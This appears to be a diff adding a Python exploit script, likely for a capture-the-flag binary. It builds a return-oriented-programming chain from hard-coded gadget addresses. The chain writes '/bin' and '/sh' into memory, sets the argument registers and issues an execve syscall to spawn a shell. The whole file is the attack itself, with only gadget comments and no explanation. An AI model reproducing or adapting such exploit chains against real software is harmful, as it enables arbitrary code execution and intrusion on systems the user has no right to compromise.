@@ -1,0 +1,31 @@
+payload = p64(0x405488)
+#0x405488: pop rax ; retf
+payload += p64(0x6e69622f)+p32(0x490058)+p32(0x33)
+# 0x490058: xchg ebx, eax ; retf 1
+payload += p32(0x4011ad)+p32(0x33)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4a0095)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x405488)
+# 0x405488: pop rax ; retf
+payload += p64(0x68662f)+p32(0x490058)+p32(0x33)
+# 0x490058: xchg ebx, eax ; retf 1
+payload += p32(0x4011ad)+p32(0x33)+"\x00"*1
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4a0099)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x405488)
+# 0x405488: pop rax ; retf
+payload += p64(0x4a0187)+p32(0x485e15)+p32(0x33)
+# 0x485e15: pop rdx ; add byte ptr [rax], al ; retf
+payload += p64(0x0)+p32(0x42cdf6)+p32(0x33)
+# 0x000000000042cdf6: pop rsi; ret; 
+payload += p64(0x0)+p64(0x405488)
+# 0x405488: pop rax ; retf
+payload += p64(0x18b4217)+p32(0x48440c)+p32(0x33)
+# 0x000000000048440c: pop rdi; test al, 0x86; fimul dword ptr [rax - 0x1414017]; ret; 
+payload += p64(0x4a0058)+p64(0x405488)
+# 0x405488: pop rax ; retf
+payload += p64(0x3b)+p32(0x4919c1)+p32(0x33)
+# 0x00000000004919c1: syscall; 
+payload += b''
